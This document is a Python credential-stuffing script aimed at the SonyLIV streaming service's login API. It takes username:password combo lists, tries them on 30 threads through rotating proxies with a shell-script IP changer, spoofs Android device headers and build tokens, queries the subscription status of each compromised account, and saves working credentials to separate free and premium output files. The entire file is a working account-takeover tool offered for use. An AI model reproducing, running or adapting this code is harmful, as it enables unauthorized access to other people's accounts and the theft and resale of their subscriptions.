import requests
from bs4 import BeautifulSoup
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json



HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
    
free = 0
prem = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
if (len(sys.argv)>=3):
    thrds= int(sys.argv[3])

input_file=sys.argv[1]
output_file_free = "SONyAc_Free"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
output_file_paid = "SONyAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
countFile = "."+sys.argv[0]+"_"+input_file+"_count" 
proxy_file = sys.argv[2]
MAX_PROXY = 0

#ua='Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Mobile Safari/537.36'
#ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'

loginURL='https://api.sonyliv.com/api/v4/auth/login'
subURL="https://api.sonyliv.com/api/subscription/getActiveSubscriptions"
       
headv1 = {
                    'x-via-device' : 'true',
                    'accept-encoding' : 'gzip, deflate',
                    'content-type' : 'application/json',
                    'x-build' : '8251cd13401c9b43941832ad1b9fc9c6a5ca45afb6fea1d3f9d5f6f5222634350bc66fa3b2f550a6b03564b1897516827f31ebe647c631dae5906478a55c15c6949bfd3f7865d3e91b9892aef0bfd72dff1252365434eb87acf0c1dfd4c5a18b3927a824440a86775aafce7b20c15566c4ab9c537593d157c1845b0f355f5ff1b5fb15f5460ca02fe448f6d9f4f2785d309ae37ce0c7cbdb009c10fc08c18e4c72dd4616c51e9fd611c7b6054a8fc60fdada0eb4bd9aab17f3fc09fcf15579f4',
                    'x-os' : 'Android',
                    'Host' : 'api.sonyliv.com',
                    'User-Agent' : 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H)'
                        } 

fi = open(input_file,'r',errors='ignore')


def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file,'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter]=i.strip()
        lock.append(0)
        availabel.append(1)
        counter+=1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter]=""
        lock.append(0)
        availabel.append(1)
        
    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")

def loadQ():
    global count
    try:
        c = open(countFile,"r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline();
    while len(line):
        q.put(line)
        line = fi.readline().strip()
    fi.close()

def free_ip():
    global availabel
    global ip_dict
    rand = 0
    while True:
        rand = random.randint(0,MAX_PROXY)
        if availabel[rand] == 1:
            break
    return ip_dict[rand],rand
    
def get_proxy():
    if MAX_PROXY == 0:
        return "",0
    ip,container = free_ip()
    proxy = {"http":"http://"+ip,
            "https":"http://"+ip}
    return proxy,container

def countLoc():
    global count
    count = count+1
    f2 = open(countFile,'w')
    f2.write(str(count))
    f2.close()

def writeFree(cred1):
    f1 = open(output_file_free,'a')
    f1.write(cred1+"\n")
    f1.close()
    
def ban_ip(container):
    global availabel;
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    lock[container] += 1    ### Setting Container offset
    if lock[container] == 1:
        unban_ip(container)
    else:
        print("Changing IP")
        
def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    print("Calling process for Container "+container_nm)
    time.sleep(5)
    res = subprocess.check_output(["change.sh",container_nm])
    #for line in res.splitlines():
        #print(line)
    lock[container] = 0
    availabel[container] = 1
    print("unblocked")

def writePaid(cred1,subs,date):
    f1 = open(output_file_paid,'a')
    template = cred1+" | Subscription: "+subs+" | Expiry: "+date
    f1.write(template+"\n")
    f1.close()
    
def checkSub(page,proxy):
    authToken = page.json()['accessToken']
    authToken1 = "Bearer "+authToken
    authToken2 = "m-token="+authToken
    payload = {"channelPartnerID":"MSMIND"}
    headv2 = {
                'x-via-device' : 'true',
                'accept-encoding' : 'gzip, deflate',
                'content-type' : 'application/json',
                'Authorization' : authToken1,
                'Cookie' : authToken2,
                'x-build' : 'b5fa421b377d670ec31d7ae9a36f4c44d0185fbf7f1e3d19485b125759408d427aeec75e01661a2d0a764a9eafcd1233de1b4cf9f64c726068f79402330d9bbc510a93d00f31e49908cbfe22240fea477a75a7b99d4a7b985c54c9d56eda86b45f1874e6735527bfa24ef2aa6ef709f048f5f4583b7668e24148c00115c2796a77eec1b39ee9c693eee5cd5d48dcad7470299a1a9bb312d495d766af9ce3c830d076a6e08cfe0e7ec41d940a5e5e79f1fc47f46993a4814026ad452ec4598827',
                'x-os' : 'Android',
                'Host' : 'api.sonyliv.com',
                'User-Agent' : 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H)'
                    }
    r1 = requests.post(subURL,headers=headv2,data=json.dumps(payload))
    free_list = ["Expired"]
    if (len(r1.json()['accountServiceMessage']) == 0):
        return "FREE","null"
    else:
        return str(r1.json()['accountServiceMessage'][0]['displayName']),"null"
    

def statusUpdate(cred, subs,container,id):
    global free
    global prem
    template =""
    if id == 1:
        template = cred+" | Subscription: "+OKBLUE+BOLD+subs+ENDC+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:"+WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    elif id == 2:
        template = cred+" | Error: "+FAIL+BOLD+subs+ENDC+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:"+WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    print(template)
    
def writeToFile(cred,subs,date):
    global free
    global prem
    if subs == "FREE":
        writeFree(cred)
        free+=1
    else:
        writePaid(cred,subs,date)
        prem+=1
        
    
class ThreadC(threading.Thread):
    def __init__(self,q):
        threading.Thread.__init__(self)
        self.queue = q
    
    def run(self):
        while not q.empty():
            cred = q.get().strip()
            un=cred.split(":")[0]
            pas=cred.split(":")[1]
            r = requests.Session()
            ts = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S+")+"0530"

            try:
                proxy,container= get_proxy()
                r.proxies = proxy
                myusr ={"appClientId":"9b05baec-50fc-419c-858c-cb07bdaf2dab","contactPassword":pas,"channelPartnerID":"MSMIND","deviceType":"Android Phone","advertisingId":"01312ba4-1c41-4de5-98b8-2ec45c114bd4","timestamp":ts,"serialNo":"d07e35cc018c5312","contactUserName":un,"deviceName":"LGE","modelNo":"LGM-V300K","gaUserId":"9b05baec-50fc-419c-858c-cb07bdaf2dab"}
                r1 = r.post(loginURL, headers=headv1, data=json.dumps(myusr),proxies=proxy)
                if (r1.status_code==200):
                   subs,exdate = checkSub(r1,proxy)
                   statusUpdate(cred,subs,container,1)
                   writeToFile(cred,subs,exdate)
                   countLoc()
                elif "Country of login must be same as registered country" in r1.json()['message']:
                    statusUpdate(cred,"Country Error",container,2)
                    q.put(cred)
                else:
                    statusUpdate(cred,r1.json()['message'],container,2)
                    countLoc()
                self.queue.task_done()
                
            except:
                print("TIMEOUT OCCURED WAITING")
                print("Unexpected error:", sys.exc_info())
                #ban_ip(container)
                q.put(cred)
                self.queue.task_done()
            

def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q)
        t.start()
    q.join()
        
main()
